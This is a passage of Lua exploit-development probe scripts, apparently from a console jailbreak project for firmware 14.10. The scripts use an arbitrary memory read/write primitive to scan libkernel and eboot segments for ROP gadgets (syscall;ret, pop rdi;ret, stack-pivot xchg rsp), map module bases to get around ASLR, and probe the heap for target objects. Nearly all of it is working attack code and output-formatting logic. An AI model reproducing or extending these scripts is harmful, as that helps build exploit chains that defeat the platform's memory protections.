    pop_r8_ret = {},     -- 41 58 C3
    pop_rbp_ret = {},    -- 5D C3
    pop_rsp_ret = {},    -- 5C C3
    ret = {},            -- C3 (standalone)
    jmp_rax = {},        -- FF E0
    call_rax = {},       -- FF D0
    xchg_rsp = {},       -- 48 94 (xchg rsp,rax) or 48 87 E0
    mov_rdi_rax = {},    -- 48 89 C7 (mov rdi,rax)
    leave_ret = {},      -- C9 C3
}

-- scan limit: 0x20000 bytes in steps of 1 byte via dword reads
-- read a dword every 1 byte is too slow. Instead read dwords every 4 bytes
-- and check all 4 byte positions within each dword
local scan_size = 0x20000
local scan_step = 4
local reads = 0
local max_reads = 8192  -- ~32KB in dword reads

for off = 0, scan_size - 4, scan_step do
    if reads >= max_reads then break end
    local dw = safe_rd(libk_text_base + off)
    if dw == nil then break end
    reads = reads + 1

    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    -- check within this dword
    -- syscall; ret = 0F 05 C3 (3 bytes, could span b0-b2 or b1-b3)
    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
        gadgets.syscall_ret[#gadgets.syscall_ret + 1] = off
    end
    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then
        gadgets.syscall_ret[#gadgets.syscall_ret + 1] = off + 1
    end

    -- pop rdi; ret = 5F C3
    if b0 == 0x5F and b1 == 0xC3 then
        gadgets.pop_rdi_ret[#gadgets.pop_rdi_ret + 1] = off
    end
    if b1 == 0x5F and b2 == 0xC3 then
        gadgets.pop_rdi_ret[#gadgets.pop_rdi_ret + 1] = off + 1
    end
    if b2 == 0x5F and b3 == 0xC3 then
        gadgets.pop_rdi_ret[#gadgets.pop_rdi_ret + 1] = off + 2
    end

    -- pop rsi; ret = 5E C3
    if b0 == 0x5E and b1 == 0xC3 then
        gadgets.pop_rsi_ret[#gadgets.pop_rsi_ret + 1] = off
    end
    if b1 == 0x5E and b2 == 0xC3 then
        gadgets.pop_rsi_ret[#gadgets.pop_rsi_ret + 1] = off + 1
    end
    if b2 == 0x5E and b3 == 0xC3 then
        gadgets.pop_rsi_ret[#gadgets.pop_rsi_ret + 1] = off + 2
    end

    -- pop rdx; ret = 5A C3
    if b0 == 0x5A and b1 == 0xC3 then
        gadgets.pop_rdx_ret[#gadgets.pop_rdx_ret + 1] = off
    end
    if b1 == 0x5A and b2 == 0xC3 then
        gadgets.pop_rdx_ret[#gadgets.pop_rdx_ret + 1] = off + 1
    end
    if b2 == 0x5A and b3 == 0xC3 then
        gadgets.pop_rdx_ret[#gadgets.pop_rdx_ret + 1] = off + 2
    end

    -- pop rcx; ret = 59 C3
    if b0 == 0x59 and b1 == 0xC3 then
        gadgets.pop_rcx_ret[#gadgets.pop_rcx_ret + 1] = off
    end
    if b1 == 0x59 and b2 == 0xC3 then
        gadgets.pop_rcx_ret[#gadgets.pop_rcx_ret + 1] = off + 1
    end
    if b2 == 0x59 and b3 == 0xC3 then
        gadgets.pop_rcx_ret[#gadgets.pop_rcx_ret + 1] = off + 2
    end

    -- pop rax; ret = 58 C3
    if b0 == 0x58 and b1 == 0xC3 then
        gadgets.pop_rax_ret[#gadgets.pop_rax_ret + 1] = off
    end
    if b1 == 0x58 and b2 == 0xC3 then
        gadgets.pop_rax_ret[#gadgets.pop_rax_ret + 1] = off + 1
    end
    if b2 == 0x58 and b3 == 0xC3 then
        gadgets.pop_rax_ret[#gadgets.pop_rax_ret + 1] = off + 2
    end

    -- pop rbp; ret = 5D C3
    if b0 == 0x5D and b1 == 0xC3 then
        gadgets.pop_rbp_ret[#gadgets.pop_rbp_ret + 1] = off
    end
    if b1 == 0x5D and b2 == 0xC3 then
        gadgets.pop_rbp_ret[#gadgets.pop_rbp_ret + 1] = off + 1
    end

    -- pop r8; ret = 41 58 C3
    if b0 == 0x41 and b1 == 0x58 and b2 == 0xC3 then
        gadgets.pop_r8_ret[#gadgets.pop_r8_ret + 1] = off
    end
    if b1 == 0x41 and b2 == 0x58 and b3 == 0xC3 then
        gadgets.pop_r8_ret[#gadgets.pop_r8_ret + 1] = off + 1
    end

    -- leave; ret = C9 C3
    if b0 == 0xC9 and b1 == 0xC3 then
        gadgets.leave_ret[#gadgets.leave_ret + 1] = off
    end
    if b1 == 0xC9 and b2 == 0xC3 then
        gadgets.leave_ret[#gadgets.leave_ret + 1] = off + 1
    end

    -- jmp rax = FF E0
    if b0 == 0xFF and b1 == 0xE0 then
        gadgets.jmp_rax[#gadgets.jmp_rax + 1] = off
    end
    if b1 == 0xFF and b2 == 0xE0 then
        gadgets.jmp_rax[#gadgets.jmp_rax + 1] = off + 1
    end

    -- call rax = FF D0
    if b0 == 0xFF and b1 == 0xD0 then
        gadgets.call_rax[#gadgets.call_rax + 1] = off
    end
    if b1 == 0xFF and b2 == 0xD0 then
        gadgets.call_rax[#gadgets.call_rax + 1] = off + 1
    end

    -- mov rdi,rax = 48 89 C7
    if b0 == 0x48 and b1 == 0x89 and b2 == 0xC7 then
        gadgets.mov_rdi_rax[#gadgets.mov_rdi_rax + 1] = off
    end
    if b1 == 0x48 and b2 == 0x89 and b3 == 0xC7 then
        gadgets.mov_rdi_rax[#gadgets.mov_rdi_rax + 1] = off + 1
    end

    -- xchg rsp,rax = 48 94 or 48 87 E4/C4
    if b0 == 0x48 and b1 == 0x94 then
        gadgets.xchg_rsp[#gadgets.xchg_rsp + 1] = off
    end
    if b0 == 0x48 and b1 == 0x87 and (b2 == 0xE4 or b2 == 0xC4) then
        gadgets.xchg_rsp[#gadgets.xchg_rsp + 1] = off
    end

    -- standalone ret
    if b0 == 0xC3 and off > 0 then
        -- only record first few
        if #gadgets.ret < 3 then
            gadgets.ret[#gadgets.ret + 1] = off
        end
    end
end

print("scanned " .. reads .. " dwords (" .. (reads * 4) .. " bytes)")
print("")

--------------------------------------------------------------------
-- STEP 3: Report findings
--------------------------------------------------------------------
print("--- STEP 3: GADGET CATALOG ---")

local function report(name, list, max_show)
    max_show = max_show or 3
    print(string.format("  %-20s: %d found", name, #list))
    for j = 1, math.min(#list, max_show) do
        print(string.format("    +0x%04X (libkernel+0x%X)", list[j], list[j]))
    end
end

report("syscall; ret", gadgets.syscall_ret)
report("pop rdi; ret", gadgets.pop_rdi_ret)
report("pop rsi; ret", gadgets.pop_rsi_ret)
report("pop rdx; ret", gadgets.pop_rdx_ret)
report("pop rcx; ret", gadgets.pop_rcx_ret)
report("pop rax; ret", gadgets.pop_rax_ret)
report("pop r8; ret", gadgets.pop_r8_ret)
report("pop rbp; ret", gadgets.pop_rbp_ret)
report("leave; ret", gadgets.leave_ret)
report("jmp rax", gadgets.jmp_rax)
report("call rax", gadgets.call_rax)
report("mov rdi,rax", gadgets.mov_rdi_rax)
report("xchg rsp,*", gadgets.xchg_rsp)
report("ret", gadgets.ret, 1)
print("")

--------------------------------------------------------------------
-- STEP 4: Verify first syscall;ret gadget by reading its bytes
--------------------------------------------------------------------
print("--- STEP 4: VERIFY GADGETS ---")
if #gadgets.syscall_ret > 0 then
    local off = gadgets.syscall_ret[1]
    print("  verifying syscall;ret at +" .. string.format("0x%X", off))
    local b0 = safe_rb(libk_text_base + off)
    local b1 = safe_rb(libk_text_base + off + 1)
    local b2 = safe_rb(libk_text_base + off + 2)
    print(string.format("  bytes: %02X %02X %02X %s",
        b0 or 0, b1 or 0, b2 or 0,
        (b0 == 0x0F and b1 == 0x05 and b2 == 0xC3) and "CONFIRMED" or "MISMATCH"))

    -- also read context: 8 bytes before and after
    print("  context:")
    for ctx = -8, 8, 4 do
        local d = safe_rd(libk_text_base + off + ctx)
        if d then
            print(string.format("    [%+d] %08X", ctx, d))
        end
    end
end

if #gadgets.pop_rdi_ret > 0 then
    local off = gadgets.pop_rdi_ret[1]
    local b0 = safe_rb(libk_text_base + off)
    local b1 = safe_rb(libk_text_base + off + 1)
    print(string.format("  pop rdi;ret at +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x5F and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
end

if #gadgets.pop_rsi_ret > 0 then
    local off = gadgets.pop_rsi_ret[1]
    local b0 = safe_rb(libk_text_base + off)
    local b1 = safe_rb(libk_text_base + off + 1)
    print(string.format("  pop rsi;ret at +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x5E and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
end

if #gadgets.pop_rdx_ret > 0 then
    local off = gadgets.pop_rdx_ret[1]
    local b0 = safe_rb(libk_text_base + off)
    local b1 = safe_rb(libk_text_base + off + 1)
    print(string.format("  pop rdx;ret at +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x5A and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
end

if #gadgets.pop_rax_ret > 0 then
    local off = gadgets.pop_rax_ret[1]
    local b0 = safe_rb(libk_text_base + off)
    local b1 = safe_rb(libk_text_base + off + 1)
    print(string.format("  pop rax;ret at +0x%X: %02X %02X %s",
        off, b0 or 0, b1 or 0,
        (b0 == 0x58 and b1 == 0xC3) and "CONFIRMED" or "MISMATCH"))
end
print("")

--------------------------------------------------------------------
-- STEP 5: Also dump all module bases for full ASLR map
--------------------------------------------------------------------
print("--- STEP 5: FULL MODULE MAP ---")
for i = 0, math.min((num_h or 0) - 1, 38) do
    local h = safe_rd(handle_buf + i * 4)
    if h then
        for off2 = 0, 0x1F8, 4 do safe_wd(info_buf + off2, 0) end
        safe_wd(info_buf, 0x160)
        local ok2 = pcall(function() sc_dynlib_get_info(uint64(h), info_buf) end)
        if ok2 then
            -- read name (up to 32 chars from +08)
            local name_bytes = {}
            for nb = 0, 31 do
                local c = safe_rb(info_buf + 0x08 + nb)
                if c and c > 0 and c < 128 then
                    name_bytes[#name_bytes + 1] = string.char(c)
                else
                    break
                end
            end
            local name = table.concat(name_bytes)

            local tbl2 = safe_rd(info_buf + 0x108)
            local tbh2 = safe_rd(info_buf + 0x10C)
            local tsl2 = safe_rd(info_buf + 0x110)

            if tbl2 and tbh2 then
                print(string.format("  [%2d] 0x%04X  %08X_%08X  sz=0x%05X  %s",
                    i, h, tbh2, tbl2, tsl2 or 0, name))
            end
        end
    end
end
print("")

print("=== PROBE 41p COMPLETE ===")
```

## probes/phase7_heap_exploitation/41q_anchor_scan.lua

```lua
-- 14.10 Probe 41q: anchor-relative scan (the 41p miss fix)
-- 41p scanned [0x310000000, 0x310A05520]: fully mapped, ZERO hits.
-- But 41p's anchor was 0x310BDCFC0 — the zone [0x310A05520, anchor]
-- was never scanned. 41k found objects ~136KB BELOW its anchor, so the
-- object field moves with the anchor. Fix: window relative to THIS
-- run's anchor, scanning downward from just under it.

print("=== 41q: ANCHOR-RELATIVE SCAN ===")
print("fw: " .. tostring(FW_VERSION))
print("pid: " .. syscall.getpid():tonumber())

local TARGET_LO = 0x1A3A4EE0

local function to_num(v)
    local ok, n = pcall(function() return v:tonumber() end)
    if ok then return n end
    return tonumber(v) or 0
end

local anchor_buf = memory.alloc(16)
local anchor = to_num(anchor_buf)
local heap_hi = math.floor(anchor / 0x100000000)
print(string.format("alloc anchor: 0x%x (hi=0x%x)", anchor, heap_hi))

-- ---------------------------------------------------------------
-- PART 1: scan DOWN from anchor-8 to anchor-4MB
-- ---------------------------------------------------------------
local BOT = anchor - 0x400000
print(string.format("scanning DOWN 0x%x -> 0x%x", anchor - 8, BOT))

local hits = {}
local a = anchor - (anchor % 8) - 8
local iter = 0
while a >= BOT do
    if memory.read_dword(a):tonumber() == TARGET_LO then
        table.insert(hits, a)
        print(string.format("HIT @ 0x%x (anchor-0x%x)", a, anchor - a))
        if #hits >= 24 then break end
    end
    a = a - 8
    iter = iter + 1
    if iter % 0x8000 == 0 then
        print(string.format("  ... 0x%x (%d hits)", a, #hits))
    end
end
print("scan done: " .. #hits .. " hits")

if #hits == 0 then
    print("still no hits — objects may live above anchor or in another arena")
    print("=== 41q DONE (no hits) ===")
    return
end

-- ---------------------------------------------------------------
-- PART 2: full header qwords
-- ---------------------------------------------------------------
print("")
print("--- full header qwords ---")
local real_P = 0
for i = 1, math.min(#hits, 8) do
    local base = hits[i]
    local qw_lo = memory.read_dword(base):tonumber()
    local qw_hi = memory.read_dword(base + 4):tonumber()
    print(string.format("obj @ 0x%x: +0 = %08x_%08x", base, qw_hi, qw_lo))
    if real_P == 0 and qw_hi ~= 0 then
        real_P = qw_hi * 0x100000000 + qw_lo
    end
end

if real_P == 0 then
    print("all high dwords 0 — TARGET is a genuine 32-bit value (tag/hash/id)")
    print("=== 41q DONE (no pointer) ===")
    return
end
print(string.format("real header pointer P = 0x%x", real_P))

-- ---------------------------------------------------------------
-- PART 3: dump at P (tag before each read)
-- ---------------------------------------------------------------
print("")
print("--- dump at P ---")
local entries = {}
for off = 0, 0x78, 8 do
    print(string.format("read P+0x%02x", off))
    local p = real_P + off
    local ql = memory.read_dword(p):tonumber()
    local qh = memory.read_dword(p + 4):tonumber()
    local v = qh * 0x100000000 + ql
    local cls = "other"
    if v == 0 then cls = "null"
    elseif v < 0x10000 then cls = "small-int"
    elseif qh == heap_hi then cls = "HEAP"
    elseif v >= 0x20000000 and v < 0x60000000 then cls = "CODE??"
    end
    print(string.format("  P+0x%02x: %08x_%08x  %s", off, qh, ql, cls))
    if v ~= 0 then table.insert(entries, { off = off, val = v, cls = cls }) end
end

-- ---------------------------------------------------------------
-- PART 4: one-level deref of heap entries
-- ---------------------------------------------------------------
print("")
print("--- deref heap entries ---")
for _, e in ipairs(entries) do
    if e.cls == "HEAP" then
        print(string.format("deref P+0x%02x -> 0x%x", e.off, e.val))
        for i = 0, 3 do
            local p = e.val + i * 8
            local ql = memory.read_dword(p):tonumber()
            local qh = memory.read_dword(p + 4):tonumber()
            print(string.format("    +%d: %08x_%08x", i * 8, qh, ql))
        end
    end
end

print("=== 41q DONE ===")
```

## probes/phase7_heap_exploitation/41q_segment_readability.lua

```lua
-- CRASH_CLASS: RISKY (may crash on XO text read)
-- PROBE 41q: test which module segments are readable
-- Theory: text segment may be execute-only (XO) on 14.10
-- If so, we can't scan for gadgets by reading code
-- Check: text, data, relro, each module
-- Also: dump all module info for offline gadget search

print("=== PROBE 41q: SEGMENT READABILITY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local sc_dynlib_get_list = make_syscall(592)
local sc_dynlib_get_info = make_syscall(593)

--------------------------------------------------------------------
-- STEP 1: Get full module map with ALL segment info
--------------------------------------------------------------------
print("--- STEP 1: FULL MODULE MAP ---")

local handle_buf = memory.alloc(512)
local num_buf = memory.alloc(8)
pcall(function() sc_dynlib_get_list(handle_buf, uint64(128), num_buf) end)
local num_h = safe_rd(num_buf) or 0
print("modules: " .. num_h)

local info_buf = memory.alloc(0x200)

-- Collect module info
local modules = {}
for i = 0, math.min(num_h - 1, 38) do
    local h = safe_rd(handle_buf + i * 4)
    if h then
        for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
        safe_wd(info_buf, 0x160)
        local ok_gi = pcall(function() sc_dynlib_get_info(uint64(h), info_buf) end)
        if ok_gi then
            local name_bytes = {}
            for nb = 0, 39 do
                local c = safe_rb(info_buf + 0x08 + nb)
                if c and c > 0 and c < 128 then
                    name_bytes[#name_bytes + 1] = string.char(c)
                else break end
            end
            local name = table.concat(name_bytes)

            -- segment layout in info struct:
            -- +108: text_base(lo), +10C: text_base(hi)
            -- +110: text_size(lo), +114: text_size(hi) or next field
            -- +118: data_base(lo), +11C: data_base(hi)
            -- +120: data_size(lo)
            -- +128: relro_base(lo)? +12C: relro_base(hi)?
            -- +130: relro_size?
            -- +138: bss_base?
            -- +140: bss_size?
            local segs = {}
            for s = 0, 5 do
                local bl = safe_rd(info_buf + 0x108 + s * 0x10)
                local bh = safe_rd(info_buf + 0x10C + s * 0x10)
                local sl = safe_rd(info_buf + 0x110 + s * 0x10)
                if bl and bh and sl and (bl ~= 0 or bh ~= 0) then
                    segs[#segs + 1] = {
                        base_hex = string.format("0x%X%08X", bh, bl),
                        bh = bh, bl = bl,
                        size = sl,
                    }
                end
            end

            modules[#modules + 1] = {
                idx = i, handle = h, name = name, segs = segs
            }

            -- print compact info
            local parts = {}
            for si, seg in ipairs(segs) do
                parts[#parts + 1] = string.format("%s+0x%X", seg.base_hex, seg.size)
            end
            print(string.format("  [%2d] h=0x%04X %-32s %s",
                i, h, name, table.concat(parts, " | ")))
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 2: Test readability of DATA segments
-- Data segments should be RW (readable). Start with these.
--------------------------------------------------------------------
print("--- STEP 2: DATA SEGMENT READABILITY ---")

for _, m in ipairs(modules) do
    if #m.segs >= 2 then
        -- seg[2] is typically data
        local dseg = m.segs[2]
        local addr = uint64(dseg.base_hex)
        local d = safe_rd(addr)
        local tag = d and string.format("%08X", d) or "FAULT"
        print(string.format("  %-24s data %s: %s", m.name, dseg.base_hex, tag))
    end
    if #m.name > 0 and m.name:find("kernel") then
        -- also try all segments for libkernel
        for si, seg in ipairs(m.segs) do
            local addr = uint64(seg.base_hex)
            local d = safe_rd(addr)
            print(string.format("    seg[%d] %s sz=0x%X: %s",
                si, seg.base_hex, seg.size,
                d and string.format("%08X", d) or "FAULT"))
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 3: Try eboot (handle 0) — it's the main executable
-- Its text might be RX (not XO) since it's not a system lib
--------------------------------------------------------------------
print("--- STEP 3: EBOOT READABILITY ---")
do
    local eboot = nil
    for _, m in ipairs(modules) do
        if m.handle == 0 then eboot = m; break end
    end
    if eboot and #eboot.segs >= 1 then
        for si, seg in ipairs(eboot.segs) do
            local addr = uint64(seg.base_hex)
            local d = safe_rd(addr)
            print(string.format("  eboot seg[%d] %s sz=0x%X: %s",
                si, seg.base_hex, seg.size,
                d and string.format("%08X", d) or "FAULT"))
            -- if readable and this is text, scan a few bytes
            if d and si == 1 then
                print("  eboot text is READABLE! first 32 bytes:")
                local bytes = {}
                for b = 0, 31 do
                    local bv = safe_rb(addr + b)
                    if bv then
                        bytes[#bytes + 1] = string.format("%02X", bv)
                    else
                        bytes[#bytes + 1] = "??"
                        break
                    end
                end
                print("    " .. table.concat(bytes, " "))

                -- quick gadget scan in eboot text
                print("  quick gadget scan (first 0x4000 bytes):")
                local sr_count = 0
                local pop_rdi = 0
                local pop_rsi = 0
                local pop_rdx = 0
                local pop_rax = 0
                local jmp_rax_c = 0
                for off = 0, 0x3FFC, 4 do
                    local dw = safe_rd(addr + off)
                    if dw == nil then break end
                    local b0 = dw % 256
                    local b1 = math.floor(dw / 256) % 256
                    local b2 = math.floor(dw / 65536) % 256
                    local b3 = math.floor(dw / 16777216) % 256
                    if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then sr_count = sr_count + 1 end
                    if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then sr_count = sr_count + 1 end
                    if b0 == 0x5F and b1 == 0xC3 then pop_rdi = pop_rdi + 1 end
                    if b1 == 0x5F and b2 == 0xC3 then pop_rdi = pop_rdi + 1 end
                    if b0 == 0x5E and b1 == 0xC3 then pop_rsi = pop_rsi + 1 end
                    if b1 == 0x5E and b2 == 0xC3 then pop_rsi = pop_rsi + 1 end
                    if b0 == 0x5A and b1 == 0xC3 then pop_rdx = pop_rdx + 1 end
                    if b1 == 0x5A and b2 == 0xC3 then pop_rdx = pop_rdx + 1 end
                    if b0 == 0x58 and b1 == 0xC3 then pop_rax = pop_rax + 1 end
                    if b1 == 0x58 and b2 == 0xC3 then pop_rax = pop_rax + 1 end
                    if b0 == 0xFF and b1 == 0xE0 then jmp_rax_c = jmp_rax_c + 1 end
                end
                print(string.format("    syscall;ret=%d pop_rdi=%d pop_rsi=%d pop_rdx=%d pop_rax=%d jmp_rax=%d",
                    sr_count, pop_rdi, pop_rsi, pop_rdx, pop_rax, jmp_rax_c))
            end
        end
    else
        print("  eboot not found")
    end
end
print("")

--------------------------------------------------------------------
-- STEP 4: Scan libkernel DATA segment for gadgets
-- Even in data, there may be embedded code (trampolines, plt stubs)
-- or pointer tables we can use
--------------------------------------------------------------------
print("--- STEP 4: LIBKERNEL DATA GADGETS ---")
do
    local libk = nil
    for _, m in ipairs(modules) do
        if m.name:find("kernel") then libk = m; break end
    end
    if libk and #libk.segs >= 2 then
        local dseg = libk.segs[2]
        local daddr = uint64(dseg.base_hex)
        local dtest = safe_rd(daddr)
        if dtest then
            print("  data readable, scanning " .. dseg.base_hex .. " sz=0x" .. string.format("%X", dseg.size))
            local sr_count = 0
            local interesting = {}
            local scan_max = math.min(dseg.size, 0x10000)
            for off = 0, scan_max - 4, 4 do
                local dw = safe_rd(daddr + off)
                if dw == nil then break end
                local b0 = dw % 256
                local b1 = math.floor(dw / 256) % 256
                local b2 = math.floor(dw / 65536) % 256
                local b3 = math.floor(dw / 16777216) % 256

                if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
                    sr_count = sr_count + 1
                    if #interesting < 8 then
                        interesting[#interesting + 1] = string.format("+0x%X: syscall;ret", off)
                    end
                end
                if b0 == 0x5F and b1 == 0xC3 then
                    if #interesting < 8 then
                        interesting[#interesting + 1] = string.format("+0x%X: pop rdi;ret", off)
                    end
                end
                if b0 == 0x58 and b1 == 0xC3 then
                    if #interesting < 8 then
                        interesting[#interesting + 1] = string.format("+0x%X: pop rax;ret", off)
                    end
                end
                if b0 == 0xFF and b1 == 0xE0 then
                    if #interesting < 8 then
                        interesting[#interesting + 1] = string.format("+0x%X: jmp rax", off)
                    end
                end
            end
            print("  syscall;ret in data: " .. sr_count)
            for _, s in ipairs(interesting) do
                print("    " .. s)
            end
        else
            print("  data segment also FAULT")
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 5: Try other modules' text segments
-- Some user libraries might not have XO
--------------------------------------------------------------------
print("--- STEP 5: OTHER MODULE TEXT ---")
for _, m in ipairs(modules) do
    if #m.segs >= 1 and m.handle ~= 0 then
        local tseg = m.segs[1]
        local addr = uint64(tseg.base_hex)
        local d = safe_rd(addr)
        local tag = d and "READABLE" or "XO/FAULT"
        -- only print first 8 non-eboot modules
        if m.idx < 10 or d then
            print(string.format("  %-24s text %s: %s",
                m.name:sub(1, 24), tseg.base_hex, tag))
        end
        -- if readable, note it as a gadget source
        if d and m.idx > 0 then
            print("    *** READABLE TEXT - can scan for gadgets ***")
        end
    end
end
print("")

print("=== PROBE 41q COMPLETE ===")
```

## probes/phase7_heap_exploitation/41r_eboot_gadgets.lua

```lua
-- CRASH_CLASS: RISKY (eboot text read may crash if XO)
-- PROBE 41r: test eboot text readability and scan for gadgets
-- From 41q: system lib text is XO, data segments readable
-- eboot is at 0x3858C000 (game range, might be RX)
-- Also scan data segments of ALL modules for embedded code

print("=== PROBE 41r: EBOOT + DATA GADGET SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local sc_dynlib_get_list = make_syscall(592)
local sc_dynlib_get_info = make_syscall(593)

--------------------------------------------------------------------
-- STEP 1: Get eboot info
--------------------------------------------------------------------
print("--- STEP 1: EBOOT INFO ---")
local info_buf = memory.alloc(0x200)
for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
safe_wd(info_buf, 0x160)
pcall(function() sc_dynlib_get_info(uint64(0), info_buf) end)

local tb_lo = safe_rd(info_buf + 0x108)
local tb_hi = safe_rd(info_buf + 0x10C)
local ts_lo = safe_rd(info_buf + 0x110)
local db_lo = safe_rd(info_buf + 0x118)
local db_hi = safe_rd(info_buf + 0x11C)

if not tb_lo or not tb_hi then
    print("FAILED to get eboot info")
    return
end

local text_hex = string.format("0x%X%08X", tb_hi, tb_lo)
local data_hex = string.format("0x%X%08X", db_hi or 0, db_lo or 0)
print("eboot text: " .. text_hex .. " size=0x" .. string.format("%X", ts_lo or 0))
print("eboot data: " .. data_hex)
print("")

--------------------------------------------------------------------
-- STEP 2: Test eboot text readability
-- eboot is at 0x03_858C000 — in game VA range, likely RX not XO
--------------------------------------------------------------------
print("--- STEP 2: EBOOT TEXT READ TEST ---")
local eboot_text = uint64(text_hex)
local test_dw = safe_rd(eboot_text)
if test_dw then
    print("EBOOT TEXT IS READABLE: " .. string.format("0x%08X", test_dw))
    -- show first 16 bytes
    local bytes = {}
    for i = 0, 15 do
        local b = safe_rb(eboot_text + i)
        bytes[#bytes + 1] = b and string.format("%02X", b) or "??"
    end
    print("first 16 bytes: " .. table.concat(bytes, " "))
else
    print("eboot text is XO/FAULT — cannot read")
    print("falling back to data-only scan")
end
print("")

--------------------------------------------------------------------
-- STEP 3: Gadget scan in eboot text (if readable)
-- Scan 0x48000 bytes (first ~300KB), report all gadgets
--------------------------------------------------------------------
if test_dw then
    print("--- STEP 3: EBOOT GADGET SCAN ---")

    local scan_size = math.min(ts_lo or 0x48000, 0x48000)
    local gadgets = {}
    local types = {
        "syscall_ret", "pop_rdi", "pop_rsi", "pop_rdx",
        "pop_rcx", "pop_rax", "pop_r8", "pop_rbp",
        "jmp_rax", "call_rax", "leave_ret",
        "mov_rdi_rax", "xchg_rsp"
    }
    for _, t in ipairs(types) do gadgets[t] = {} end

    local reads = 0
    for off = 0, scan_size - 4, 4 do
        local dw = safe_rd(eboot_text + off)
        if dw == nil then break end
        reads = reads + 1

        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256

        -- syscall;ret (0F 05 C3)
        if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
            gadgets.syscall_ret[#gadgets.syscall_ret + 1] = off
        end
        if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then
            gadgets.syscall_ret[#gadgets.syscall_ret + 1] = off + 1
        end

        -- pop reg; ret patterns
        local pop_patterns = {
            {byte=0x5F, name="pop_rdi"},
            {byte=0x5E, name="pop_rsi"},
            {byte=0x5A, name="pop_rdx"},
            {byte=0x59, name="pop_rcx"},
            {byte=0x58, name="pop_rax"},
            {byte=0x5D, name="pop_rbp"},
        }
        for _, pp in ipairs(pop_patterns) do
            if b0 == pp.byte and b1 == 0xC3 then
                gadgets[pp.name][#gadgets[pp.name] + 1] = off
            end
            if b1 == pp.byte and b2 == 0xC3 then
                gadgets[pp.name][#gadgets[pp.name] + 1] = off + 1
            end
            if b2 == pp.byte and b3 == 0xC3 then
                gadgets[pp.name][#gadgets[pp.name] + 1] = off + 2
            end
        end

        -- pop r8; ret (41 58 C3)
        if b0 == 0x41 and b1 == 0x58 and b2 == 0xC3 then
            gadgets.pop_r8[#gadgets.pop_r8 + 1] = off
        end
        if b1 == 0x41 and b2 == 0x58 and b3 == 0xC3 then
            gadgets.pop_r8[#gadgets.pop_r8 + 1] = off + 1
        end

        -- jmp rax (FF E0), call rax (FF D0)
        if b0 == 0xFF and b1 == 0xE0 then
            gadgets.jmp_rax[#gadgets.jmp_rax + 1] = off
        end
        if b1 == 0xFF and b2 == 0xE0 then
            gadgets.jmp_rax[#gadgets.jmp_rax + 1] = off + 1
        end
        if b0 == 0xFF and b1 == 0xD0 then
            gadgets.call_rax[#gadgets.call_rax + 1] = off
        end

        -- leave;ret (C9 C3)
        if b0 == 0xC9 and b1 == 0xC3 then
            gadgets.leave_ret[#gadgets.leave_ret + 1] = off
        end
        if b1 == 0xC9 and b2 == 0xC3 then
            gadgets.leave_ret[#gadgets.leave_ret + 1] = off + 1
        end

        -- mov rdi,rax;ret (48 89 C7 C3) — 4 bytes
        if b0 == 0x48 and b1 == 0x89 and b2 == 0xC7 and b3 == 0xC3 then
            gadgets.mov_rdi_rax[#gadgets.mov_rdi_rax + 1] = off
        end

        -- xchg rsp,rax (48 94)
        if b0 == 0x48 and b1 == 0x94 then
            gadgets.xchg_rsp[#gadgets.xchg_rsp + 1] = off
        end

        -- limit scan to avoid overwhelming the loader
        if reads >= 0x12000 then break end
    end

    print("scanned: " .. reads * 4 .. " bytes")
    print("")
    print("GADGET CATALOG:")
    for _, t in ipairs(types) do
        local list = gadgets[t]
        local label = t:gsub("_", " ")
        print(string.format("  %-16s: %d found", label, #list))
        for j = 1, math.min(#list, 5) do
            print(string.format("    eboot+0x%06X", list[j]))
        end
    end
    print("")

    -- verify top gadgets
